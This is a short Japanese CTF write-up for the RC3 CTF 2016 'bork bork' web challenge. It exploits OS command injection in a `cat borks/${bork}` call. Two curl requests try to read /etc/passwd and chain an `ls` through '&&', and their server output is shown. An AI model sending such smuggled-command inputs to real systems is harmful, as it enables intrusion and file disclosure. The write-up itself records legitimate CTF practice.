---
layout: post
alias: "/blog/2016/11/21/rc3-ctf-2016-bork-bork/"
date: "2016-11-21T17:47:26+09:00"
tags: [ "ctf", "writeup", "rc3-ctf", "web", "os-command-injection" ]
---

# RC3 CTF 2016: bork bork


れべな氏にosコマンドインジェクションと言われて続きをやった。
`cat borks/${bork}`で入るので`../bork.txt`を読めばflag: `RC3-2016-L057d0g3`。
分かりにくいファイル名はやめろ。

`;`や`*`は禁止文字だったぽい？

``` sh
$ curl https://ctf.rc3.club:3100/bork -F bork='/etc/passwd'
<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" type="text/css" href="/static/bork.css">
        <link rel="shortcut icon" href="/static/favicon.ico">
    </head>
    <body>
        <h1>HERE'S YOUR BORK!!!!</h1>
        <iframe width="854" height="480" src="cat: borks//etc/passwd: No such file or directory?autoplay=1&loop=1" frameborder="0"></iframe>
    </body>
</html>
```

``` sh
$ curl https://ctf.rc3.club:3100/bork -F bork='TheBorkFiles.txt&&ls'
<!DOCTYPE html>
<html>
    <head>
        <link rel="stylesheet" type="text/css" href="/static/bork.css">
        <link rel="shortcut icon" href="/static/favicon.ico">
    </head>
    <body>
        <h1>HERE'S YOUR BORK!!!!</h1>
        <iframe width="854" height="480" src="https://www.youtube.com/embed/AuRXVMSG3po
auto_bork.sh
bork.ini
bork.py
bork.pyc
borks
bork.sock
bork.txt
static
templates
wsgi.py
wsgi.pyc?autoplay=1&loop=1" frameborder="0"></iframe>
    </body>
</html>
```
